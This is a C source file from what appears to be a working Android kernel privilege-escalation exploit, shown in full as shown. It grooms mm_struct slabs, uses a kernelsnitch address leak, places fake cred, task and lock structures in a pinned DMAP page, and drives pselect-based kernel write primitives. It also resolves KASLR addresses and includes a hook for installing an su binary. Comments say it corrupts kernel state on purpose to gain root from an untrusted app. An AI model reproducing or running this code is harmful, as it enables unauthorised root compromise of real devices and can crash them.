#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include <stdarg.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int skb_buf_is_mmap;
int g_force_groom = 0;
uint32_t g_lock_off = 0x1350;
uint32_t g_w0_off = 0x2220;
uint32_t g_task_off = 0x3200;
uint32_t g_cred_off = 0x2400;
int g_skb_delta = (int)SKB_DATA_DELTA;
pid_t g_leak_pid = -1;
int g_drain_slabs = 24;

/* v19: persistent DMAP payload page.  Built and pagemap-verified ONCE, then
   shared with every forked primitive child through MAP_SHARED|MAP_ANONYMOUS -
   a private mapping would COW on the child's prepare_skb_payload() write and
   silently de-contiguise the run the kernel's alias points at.  mlock() pins
   it so compaction / a THP split cannot migrate the page out from under the
   alias.  Each primitive rebuilds the structures in place, which also repairs
   whatever the previous primitive's collateral write left behind. */
static unsigned char *dmap_page;
static size_t dmap_keep;
static uintptr_t dmap_base;
static int dmap_built;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
/* §58 drain: hold enough mm_structs to consume every partially-used slab on the
   pinned CPU (active 1 + cpu_partial 13 + node min_partial 5 ~= 19 partial slabs
   x up to 16 free slots ~= 306 worst case), so the NEXT allocation opens a fresh
   slab that can be filled entirely with our own children.  Slot index does not
   matter (SLAB_FREELIST_RANDOM) - ownership does. */
static struct mm_ctx drain_ctx;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_cred;
uint64_t fake_cred_security;
uint64_t fake_cred_user_ns;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_custom_shape;
int direct_root_cpu = -1;
int g_probe_stop = 0;
int g_no_restore = 0;
int g_stress = 0;

static cpu_set_t initial_affinity;
static int initial_affinity_valid;

/* -------- persistent, crash-surviving log sink (see utils.h pr_* macros) ----
   The exploit now corrupts kernel state on purpose, so the process can die
   mid-attempt and take logcat with it. Worse, the forked slide child's logd
   fd is clobbered by the pselect fd install, so its lines never reach logcat
   at all; and an untrusted_app is frequently denied READ_LOGS so the launcher
   can't `logcat -d` reliably either. So every pr_* line is also appended to a
   plain file the app can always read back.

   Path: $POC_LOG_FILE if the launcher set it (it does), else derived from the
   loaded libpreload.so mapping (same dir, "preload.log"), else a tmp fallback.
   The fd is opened once, early (before any fd spray), duplicated to a high
   number (>=900) so the slide/fops fd-install dup2 loops ??which only touch
   fds 0..~449 ??cannot clobber it, and inherited across fork so child lines
   are captured. O_APPEND accumulates across runs. write() alone survives a
   userspace crash; flush=1 (pr_error/pr_success) also fsyncs for reboot/panic. */
static int poc_log_fd = -1; /* -1 = unopened, -2 = permanently failed */

static void poc_log_build_path(char *out, size_t outsz) {
  out[0] = 0;
  const char *env = getenv("POC_LOG_FILE");
  if (env && env[0]) {
    snprintf(out, outsz, "%s", env);
    return;
  }
  FILE *mf = fopen("/proc/self/maps", "r"); /* closed below; CLOEXEC irrelevant */
  if (mf) {
    char line[512];
    while (fgets(line, sizeof(line), mf)) {
      if (!strstr(line, "libpreload.so")) {
        continue;
      }
      char *slash = strchr(line, '/'); /* pathname starts at the first '/' */
      if (!slash) {
        continue;
      }
      size_t L = strlen(slash);
      while (L && (slash[L - 1] == '\n' || slash[L - 1] == '\r')) {
        slash[--L] = 0;
      }
      char *bn = strrchr(slash, '/');
      if (bn && (size_t)(bn - slash) + sizeof("/preload.log") < outsz) {
        int dirlen = (int)(bn - slash); /* dir without trailing slash */
        snprintf(out, outsz, "%.*s/preload.log", dirlen, slash);
      }
      break;
    }
    fclose(mf);
  }
  if (!out[0]) {
    snprintf(out, outsz, "/data/local/tmp/aristotle_preload.log");
  }
}

void poc_flog(int flush, const char *fmt, ...) {
  if (poc_log_fd == -2) {
    return;
  }
  if (poc_log_fd < 0) {
    char path[256];
    poc_log_build_path(path, sizeof(path));
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
    if (fd < 0) {
      poc_log_fd = -2;
      return;
    }
    int hi = fcntl(fd, F_DUPFD_CLOEXEC, 900);
    if (hi >= 0) {
      close(fd);
      fd = hi;
    }
    poc_log_fd = fd;
  }

  char buf[1024];
  struct timespec ts;
  clock_gettime(CLOCK_REALTIME, &ts);
  int n = snprintf(buf, sizeof(buf), "%ld.%03ld %d ", (long)ts.tv_sec,
                   ts.tv_nsec / 1000000, (int)getpid());
  if (n < 0) {
    n = 0;
  }
  if (n > (int)sizeof(buf)) {
    n = (int)sizeof(buf);
  }
  va_list ap;
  va_start(ap, fmt);
  int m = vsnprintf(buf + n, sizeof(buf) - (size_t)n, fmt, ap);
  va_end(ap);
  if (m > 0) {
    n += m;
    if (n > (int)sizeof(buf)) {
      n = (int)sizeof(buf);
    }
  }
  (void)!write(poc_log_fd, buf, (size_t)n);
  if (flush) {
    fsync(poc_log_fd);
  }
}

static int read_sysfs_u64(const char *path, uint64_t *out) {
  char buf[64];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  buf[n] = 0;

  char *end = NULL;
  errno = 0;
  unsigned long long value = strtoull(buf, &end, 10);
  if (errno || end == buf) {
    return 0;
  }
  while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
    end++;
  }
  if (*end) {
    return 0;
  }
  *out = (uint64_t)value;
  return 1;
}

int init_direct_root_cpu(void) {
  if (sched_getaffinity(0, sizeof(initial_affinity), &initial_affinity) != 0) {
    return 0;
  }
  initial_affinity_valid = 1;

  long configured = sysconf(_SC_NPROCESSORS_CONF);
  if (configured <= 0 || configured > CPU_SETSIZE) {
    configured = CPU_SETSIZE;
  }

  int best = -1;
  int fallback = -1;
  uint64_t best_freq = 0;
  uint64_t best_capacity = 0;
  for (int cpu = 0; cpu < configured; cpu++) {
    if (!CPU_ISSET(cpu, &initial_affinity)) {
      continue;
    }

    char path[160];
    uint64_t online = 1;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/online", cpu);
    if (read_sysfs_u64(path, &online) && online != 1) {
      continue;
    }
    fallback = cpu;

    uint64_t freq = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
    if (!read_sysfs_u64(path, &freq)) {
      snprintf(path, sizeof(path),
               "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
      if (!read_sysfs_u64(path, &freq)) {
        continue;
      }
    }

    uint64_t capacity = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpu_capacity", cpu);
    (void)read_sysfs_u64(path, &capacity);

    if (best < 0 || freq > best_freq ||
        (freq == best_freq && capacity > best_capacity) ||
        (freq == best_freq && capacity == best_capacity && cpu > best)) {
      best = cpu;
      best_freq = freq;
      best_capacity = capacity;
    }
  }

  if (best < 0) {
    int current = sched_getcpu();
    if (current >= 0 && current < CPU_SETSIZE &&
        CPU_ISSET(current, &initial_affinity)) {
      best = current;
    } else {
      best = fallback;
    }
    if (best >= 0) {
      pr_warning("CPU max frequency unavailable; fallback cpu=%d\n", best);
    }
  }

  /*
   * v12: the shape-0 write primitive is inherently "collateral": it writes
   * *B = Q AND *(Q+8) = B.  The first read targets Q = &__per_cpu_offset[cpu],
   * so the collateral clobbers __per_cpu_offset[cpu+1]; if that is a LIVE cpu
   * its per-CPU base becomes garbage and the machine panics in the scheduler
   * / RCU.  Pinning to the HIGHEST online cpu makes cpu+1 an unused slot
   * (out of the possible-cpu range), so the collateral is harmless.
   */
  {
    int highest = -1;
    for (int cpu = 0; cpu < configured; cpu++) {
      char path[160];
      uint64_t online = 1;
      snprintf(path, sizeof(path),
               "/sys/devices/system/cpu/cpu%d/online", cpu);
      if (read_sysfs_u64(path, &online) && online != 1) {
        continue;
      }
      highest = cpu;
    }
    if (highest >= 0) {
      pr_success("direct cpu override: highest online cpu=%d (was %d)\n",
                 highest, best);
      best = highest;
    }
  }

  if (best < 0) {
    errno = ENODEV;
    return 0;
  }

  direct_root_cpu = best;
  pr_success("runtime performance cpu=%d max_freq=%llu capacity=%llu\n",
             best, (unsigned long long)best_freq,
             (unsigned long long)best_capacity);
  return 1;
}

int restore_initial_affinity(void) {
  if (!initial_affinity_valid) {
    errno = EINVAL;
    return 0;
  }
  return sched_setaffinity(
      0, sizeof(initial_affinity), &initial_affinity) == 0;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("startup pid=%d uid=%u attr=%s enforce=%s direct_cpu=%d\n",
             getpid(), getuid(), attr, enforce, direct_root_cpu);
}

void log_slide_child_context(void) {
  pr_success("slide child pid=%d uid=%u direct_cpu=%d\n",
             getpid(), getuid(), direct_root_cpu);
}

void disable_rseq_for_thread(void) {
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}

uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}

int pselect_write_shape(void) {
  return pselect_custom_shape;
}

void set_pselect_write(uintptr_t target, uintptr_t value, int shape) {
  /* §124.123 E4 write-primitive calibration was applied here, but that also
     redirected the ownprobe's own in-page target/value, killing the HIT.
     The calibration now lives in persist.c pr_seq_write() (seq rounds only). */
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_shape = shape;
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static uint64_t get64(const unsigned char *p, size_t off) {
  uint64_t v;
  memcpy(&v, p + off, sizeof(v));
  return v;
}

static uint32_t get32(const unsigned char *p, size_t off) {
  uint32_t v;
  memcpy(&v, p + off, sizeof(v));
  return v;
}

static pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

static pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    pin_to_core((size_t)direct_root_cpu);
    kernelsnitch_find_collisions(ks);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  /* Only opened/closed to keep the child's mm pinned; SELinux may deny
     (u:r:shell:s0 cannot attach) - that is non-fatal, so no SYSCHK. */
  return open(path, O_RDONLY | O_CLOEXEC);
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
    return;
  }
  waitpid(child, NULL, 0);
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

/* v9 grooming: hold an mm_struct via a LIVE paused child (not a
   /proc/pid/mem fd, whose close does NOT free the mm - see STATUS §54/§55).
   Release = kill_child() -> exit_mm drops the last ref -> mm really freed. */
/* §90: count processes whose parent is us.  Distinguishes "the kill never got
   sent / the pid ledger is wrong" (children still alive) from "the mm is pinned"
   (children gone, mm alive). */
#ifndef ZF9_DEVICE
static int count_live_children(void) {
  DIR *d = opendir("/proc");
  if (!d) {
    return -1;
  }
  struct dirent *e;
  int n = 0;
  pid_t me = getpid();
  char path[64];
  char buf[1024];
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] < '0' || e->d_name[0] > '9') {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/%s/stat", e->d_name);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0) {
      continue;
    }
    buf[r] = 0;
    char *cp = strrchr(buf, ')');
    if (!cp || cp[1] == 0) {
      continue;
    }
    char state = 0;
    long ppid = -1;
    if (sscanf(cp + 1, " %c %ld", &state, &ppid) != 2) {
      continue;
    }
    if (ppid == (long)me) {
      n++;
    }
  }
  closedir(d);
  return n;
}
#else
static int count_live_children(void) { return -1; }
#endif

/* §93: a dead mm can stay pinned by lazy-TLB (some kthread borrowed it as
   active_mm, mm_count > 0).  Running a short user task on EVERY cpu forces the
   scheduler to install a fresh active_mm, dropping the dead one's mm_count so
   free_mm() can finally run. */
#ifndef ZF9_DEVICE
static void flush_lazy_tlb_active_mm(void) {
  long n = sysconf(_SC_NPROCESSORS_ONLN);
  if (n < 1) {
    n = 4;
  }
  pid_t pids[64];
  int cnt = 0;
  for (long c = 0; c < n && cnt < 64; c++) {
    pid_t p = fork();
    if (p == 0) {
      pin_to_core((size_t)c);
      for (volatile long i = 0; i < 4000000; i++) {
        if ((i & 0xffff) == 0) {
          sched_yield();
        }
      }
      _exit(0);
    }
    if (p > 0) {
      pids[cnt++] = p;
    }
  }
  for (int i = 0; i < cnt; i++) {
    waitpid(pids[i], NULL, 0);
  }
  pr_success("lazy-tlb flush: %d tasks run across %ld cpus\n", cnt, n);
}
#else
static void flush_lazy_tlb_active_mm(void) {}
#endif

/* §94: full process table (not just our ledger) - an unaccounted helper such as
   a blocking `cat trace_pipe` holds its own mm and never frees it. */
#ifndef ZF9_DEVICE
static void list_all_procs(const char *tag) {
  DIR *d = opendir("/proc");
  if (!d) {
    return;
  }
  struct dirent *e;
  char path[64];
  char buf[1024];
  char comm[64];
  int n = 0;
  pid_t me = getpid();
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] < '0' || e->d_name[0] > '9') {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/%s/stat", e->d_name);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0) {
      continue;
    }
    buf[r] = 0;
    char *lp = strchr(buf, '(');
    char *rp = strrchr(buf, ')');
    if (!lp || !rp || rp <= lp) {
      continue;
    }
    size_t cl = (size_t)(rp - lp - 1);
    if (cl >= sizeof(comm)) {
      cl = sizeof(comm) - 1;
    }
    memcpy(comm, lp + 1, cl);
    comm[cl] = 0;
    char state = 0;
    long ppid = -1;
    if (sscanf(rp + 1, " %c %ld", &state, &ppid) != 2) {
      continue;
    }
    pr_success("proc %s: pid=%s ppid=%ld state=%c comm=%s%s\n", tag, e->d_name,
               ppid, state, comm, ppid == (long)me ? " [ours]" : "");
    n++;
  }
  closedir(d);
  pr_success("proc %s: total=%d\n", tag, n);
}
#else
static void list_all_procs(const char *tag) { (void)tag; }
#endif

/* §96 part 3: rotation dance.  If the leaked slab is the CPU's *active* (frozen)
   slab, its freed objects sit on a frozen freelist and can never be discarded.
   Allocating >= objs_per_slab+1 fresh mms re-takes those slots (filling the
   frozen slab) and forces the CPU onto a new active slab, deactivating the old
   one; freeing them again then hits a non-frozen slab -> discard -> buddy. */
#ifndef ZF9_DEVICE
static void rotation_dance(void) {
  enum { ROT_N = 24 };
  pid_t pids[ROT_N];
  int n = 0;
  for (int i = 0; i < ROT_N; i++) {
    pid_t p = fork();
    if (p == 0) {
      for (;;) {
        pause();
      }
    }
    if (p > 0) {
      pids[n++] = p;
    }
  }
  usleep(20000);
  for (int i = 0; i < n; i++) {
    if (pids[i] > 0) {
      kill(pids[i], SIGKILL);
      waitpid(pids[i], NULL, 0);
    }
  }
  pr_success("rotation dance: %d disposable children alloc+free\n", n);
}
#else
static void rotation_dance(void) {}
#endif

static void close_ctx_memfds(struct mm_ctx *ctx) {
  int ok = 0, esrch = 0, err = 0, skipped = 0;
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] >= 0) {
      pid_t pid = (pid_t)ctx->memfds[i];
      errno = 0;
      int r = kill(pid, SIGKILL);
      if (r == 0) {
        ok++;
        waitpid(pid, NULL, 0);
      } else if (errno == ESRCH) {
        esrch++;
      } else {
        err++;
      }
      ctx->memfds[i] = -1;
    } else {
      skipped++;
    }
  }
  pr_success("release ctx: cnt=%zu killed=%d esrch=%d err=%d already=%d\n",
             ctx->mm_cnt, ok, esrch, err, skipped);
}

static void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->memfds);
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  close_ctx_memfds(&drain_ctx);
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free_ctx_storage(&drain_ctx);
  if (skb_buf && !skb_buf_is_mmap) {
    free(skb_buf);
  }
  skb_buf = NULL;
}

static int clone_memfd(void) {
  /* v9: return the live child's PID as the mm handle (no /proc/pid/mem fd). */
  return (int)clone_child();
}

static void init_ctx(struct mm_ctx *ctx, size_t count) {
  ctx->mm_cnt = count;
  ctx->memfds = malloc(count * sizeof(*ctx->memfds));
  if (!ctx->memfds) {
    pr_error("mm context allocation failed count=%zu\n", count);
  }
  for (size_t i = 0; i < count; i++) {
    ctx->memfds[i] = -1;
  }
}

static void prepare_ctxs(void) {
  init_ctx(&prepare_ctx, 8 * mm_objs_per_slab);
  init_ctx(&spray_ctx, (1 + MM_PARTIALS) * mm_objs_per_slab);
  init_ctx(&pre_ctx, mm_objs_per_slab - 1);
  init_ctx(&post_ctx, mm_objs_per_slab);
  init_ctx(&drain_ctx, (size_t)g_drain_slabs * mm_objs_per_slab);
}

/* §51 endpoint test: watch kmem:mm_page_free for the leaked slab's PFN.  If the
   release really discards the slab to the buddy, the PFN must appear here.  The
   exploit sets the filter itself (it knows the leaked address); the trace_pipe
   is already piped to the console by the initramfs. */
#ifndef ZF9_DEVICE
static void trace_watch_page_free(uintptr_t leaked) {
  unsigned long pfn =
      (unsigned long)(((leaked - P0_PAGE_OFFSET) + P0_PHYS_OFFSET) >> 12);
  char buf[160];
  int n = snprintf(buf, sizeof(buf), "pfn == 0x%lx", pfn);
  int fd = open("/sys/kernel/tracing/events/kmem/mm_page_free/filter",
                O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, buf, (size_t)n);
    (void)w;
    close(fd);
  }
  fd = open("/sys/kernel/tracing/events/kmem/mm_page_free/enable", O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "1", 1);
    (void)w;
    close(fd);
  }
  pr_success("trace: mm_page_free watch pfn=0x%lx (filter \"%s\")\n", pfn, buf);
}
#else
static void trace_watch_page_free(uintptr_t leaked) { (void)leaked; }
#endif

/* §97 per-object ledger: the sysfs object counters are unusable, so arm the
   kmem_cache_alloc/kmem_cache_free probes restricted to the leaked slab's
   16 KB range and read back every alloc/free of an object inside it.  Each
   trace line carries the caller's comm-pid, which is what names the owner. */
#ifndef ZF9_DEVICE
static void set_probe_filter(const char *name, uintptr_t lo, uintptr_t hi) {
  char path[160];
  char buf[160];
  snprintf(path, sizeof(path), "/sys/kernel/tracing/events/kprobes/%s/filter",
           name);
  int n = snprintf(buf, sizeof(buf), "ptr >= 0x%llx && ptr < 0x%llx",
                   (unsigned long long)lo, (unsigned long long)hi);
  int fd = open(path, O_WRONLY);
  if (fd < 0) {
    pr_warning("ledger: no probe %s\n", name);
    return;
  }
  ssize_t w = write(fd, buf, (size_t)n);
  (void)w;
  close(fd);
}

static void ledger_filter_all(const char *name, int on) {
  char path[160];
  snprintf(path, sizeof(path), "/sys/kernel/tracing/events/kprobes/%s/filter",
           name);
  int fd = open(path, O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, on ? "1" : "0", 1);
    (void)w;
    close(fd);
  }
}

/* The initramfs runs `cat trace_pipe`, which CONSUMES the ring buffer.  A
   non-consuming read of .../trace then sees nothing, so kill the reader first. */static void kill_trace_readers(void) {
  DIR *d = opendir("/proc");
  if (!d) {
    return;
  }
  struct dirent *e;
  int n = 0;
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] < '0' || e->d_name[0] > '9') {
      continue;
    }
    char path[64];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", e->d_name);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
      continue;
    }
    char b[256];
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) {
      continue;
    }
    b[r] = 0;
    if (strstr(b, "trace_pipe")) {
      kill((pid_t)atoi(e->d_name), SIGKILL);
      n++;
    } else if (strstr(b, "tracing") || strstr(b, "cat")) {
      pr_info("ledger: neighbour pid=%s cmdline=%s\n", e->d_name, b);
    }
  }
  closedir(d);
  pr_success("ledger: killed %d trace_pipe reader(s)\n", n);
}

/* Why did an accept-all filter produce no events?  Print the switches. */
static void ledger_diag(void) {
  static const char *files[] = {
      "/sys/kernel/tracing/tracing_on",
      "/sys/kernel/tracing/events/kprobes/enable",
      "/sys/kernel/tracing/events/kprobes/kmfa/enable",
      "/sys/kernel/tracing/events/kprobes/kmfa/filter",
      "/sys/kernel/tracing/events/kprobes/kmma/enable",
  };
  for (size_t i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
    char buf[64];
    int fd = open(files[i], O_RDONLY);
    if (fd < 0) {
      pr_warning("ledger diag: %s OPEN FAILED\n", files[i]);
      continue;
    }
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r > 0) {
      buf[r] = 0;
      pr_info("ledger diag: %s = %s", files[i], buf);
    }
  }
  char big[256];
  int fd = open("/sys/kernel/tracing/trace", O_RDONLY);
  if (fd < 0) {
    pr_warning("ledger diag: trace OPEN FAILED\n");
    return;
  }
  ssize_t r = read(fd, big, sizeof(big) - 1);
  close(fd);
  if (r > 0) {
    big[r] = 0;
    pr_info("ledger diag: raw trace head >>>%s<<<\n", big);
  } else {
    pr_warning("ledger diag: raw trace EMPTY (r=%zd)\n", r);
  }
}

static void clear_trace(void) {
  int fd = open("/sys/kernel/tracing/trace", O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "0", 1);
    (void)w;
    close(fd);
  }
}

static void ledger_probe_enable(const char *name, int on) {
  char path[160];
  snprintf(path, sizeof(path), "/sys/kernel/tracing/events/kprobes/%s/enable",
           name);
  int fd = open(path, O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, on ? "1" : "0", 1);
    (void)w;
    close(fd);
  }
}

static void ledger_diag(void);
static void mm_slab_ledger_dump(const char *tag, uintptr_t leaked);
static void mm_slab_ledger_arm(uintptr_t leaked) {
  uintptr_t slab = leaked & ~(uintptr_t)(0x4000 - 1);
  kill_trace_readers();
  clear_trace();
  /* kmma (allocs) stays armed with the wide filter for the ownership test;
     add the narrow free filter for the leaked slab. */
  set_probe_filter("kmfa", slab, slab + 0x4000);
  ledger_probe_enable("kmfa", 1);
  ledger_probe_enable("kcp", 1);
  pr_success("ledger: armed slab=[0x%llx,0x%llx) leak_slot=%llu\n",
             (unsigned long long)slab, (unsigned long long)(slab + 0x4000),
             (unsigned long long)((leaked - slab) / 0x3c0));
}

static void mm_slab_ledger_dump(const char *tag, uintptr_t leaked) {
  uintptr_t slab_lo = leaked & ~(uintptr_t)(0x4000 - 1);
  uintptr_t slab_hi = slab_lo + 0x4000;
  int fd = open("/sys/kernel/tracing/trace", O_RDONLY);
  if (fd < 0) {
    return;
  }
  size_t cap = 32u << 20;
  char *buf = malloc(cap);
  if (!buf) {
    close(fd);
    return;
  }
  size_t used = 0;
  ssize_t n;
  while (used + 1 < cap && (n = read(fd, buf + used, cap - used - 1)) > 0) {
    used += (size_t)n;
  }
  close(fd);
  buf[used] = 0;
  int shown = 0;
  char *p = buf;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (nl) {
      *nl = 0;
    }
    if (strstr(p, "kmfa:")) {
      char *a = strstr(p, "ptr=0x");
      uintptr_t v = a ? (uintptr_t)strtoull(a + 6, NULL, 16) : 0;
      if (v >= slab_lo && v < slab_hi) {
        pr_info("LEDGER %s: %s\n", tag, p);
        shown++;
        if (shown >= 64) {
          pr_info("LEDGER %s: ... truncated\n", tag);
          break;
        }
      }
    }
    if (!nl) {
      break;
    }
    p = nl + 1;
  }
  pr_success("ledger %s: %d in-slab frees\n", tag, shown);
  free(buf);
}

/* Ownership test: record every mm_struct ALLOCATION from before the pre/leak/post
   spawn so the leaked address can be matched against the mms we own. */
static char *trace_read_all(void) {
  int fd = open("/sys/kernel/tracing/trace", O_RDONLY);
  if (fd < 0) {
    return NULL;
  }
  size_t cap = 32u << 20;
  char *buf = malloc(cap);
  if (!buf) {
    close(fd);
    return NULL;
  }
  size_t used = 0;
  ssize_t n;
  while (used + 1 < cap && (n = read(fd, buf + used, cap - used - 1)) > 0) {
    used += (size_t)n;
  }
  close(fd);
  buf[used] = 0;
  return buf;
}

static void ledger_track_allocs_arm(void) {
  kill_trace_readers();
  ledger_probe_enable("kmfa", 0);
  set_probe_filter("kcp", P0_PAGE_OFFSET, P0_PAGE_OFFSET + 0x10000000000ULL);
  ledger_probe_enable("kcp", 1);
  clear_trace();
}

/* Kretprobes never fire on this kernel, so ownership is answered from the
   working kmem_cache_free probe instead: open a wide free window around the
   final release and look at which mm addresses (page-aligned, 0x3c0-multiple
   offsets) actually get freed. */
static void ledger_free_window_begin(void) {
  kill_trace_readers();
  set_probe_filter("kmfa", P0_PAGE_OFFSET, P0_PAGE_OFFSET + 0x10000000000ULL);
  ledger_probe_enable("kmfa", 1);
  clear_trace();
}

static void ledger_report_switches(const char *tag) {
  static const char *files[] = {
      "/sys/kernel/tracing/tracing_on",
      "/sys/kernel/tracing/events/kprobes/enable",
      "/sys/kernel/tracing/events/kprobes/kmfa/enable",
      "/sys/kernel/tracing/events/kprobes/kmfa/filter",
  };
  char line[256] = {0};
  for (size_t i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
    char buf[64] = {0};
    int fd = open(files[i], O_RDONLY);
    if (fd < 0) {
      strcat(line, "? ");
      continue;
    }
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r > 0) {
      strncat(line, buf, sizeof(line) - strlen(line) - 1);
      strncat(line, " ", sizeof(line) - strlen(line) - 1);
    }
  }
  char hdr[160] = {0};
  int fd = open("/sys/kernel/tracing/trace", O_RDONLY);
  if (fd >= 0) {
    ssize_t r = read(fd, hdr, sizeof(hdr) - 1);
    close(fd);
    if (r > 0) {
      char *nl = strchr(hdr, '\n');
      if (nl) {
        *nl = 0;
      }
    }
  }
  pr_info("ledger sw %s: on=%s hdr=%s\n", tag, line, hdr);
}

/* ftrace filter literals >= 2^63 are parsed as doubles, so a high-address range
   filter silently matches nothing.  __mmdrop needs no filter at all: it fires
   exactly once per mm_struct free, so its `mm` fetch arg is the whole ledger. */
static void ledger_dump_mmdrops(const char *tag, uintptr_t leaked) {
  uintptr_t slab_lo = leaked & ~(uintptr_t)(0x4000 - 1);
  uintptr_t slab_hi = slab_lo + 0x4000;
  char alive[64] = {0};
  if (g_leak_pid > 0) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d", (int)g_leak_pid);
    snprintf(alive, sizeof(alive), "leak_pid=%d %s", (int)g_leak_pid,
             access(path, F_OK) == 0 ? "ALIVE" : "gone");
  }
  char *buf = trace_read_all();
  if (!buf) {
    return;
  }
  int total = 0;
  int in_slab = 0;
  int same_page_any = 0;
  char sample[6][32] = {{0}};
  int shown = 0;
  char *p = buf;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (nl) {
      *nl = 0;
    }
    if (strstr(p, "kdrop:")) {
      char *a = strstr(p, "mm=0x");
      if (a) {
        uintptr_t v = (uintptr_t)strtoull(a + 5, NULL, 16);
        total++;
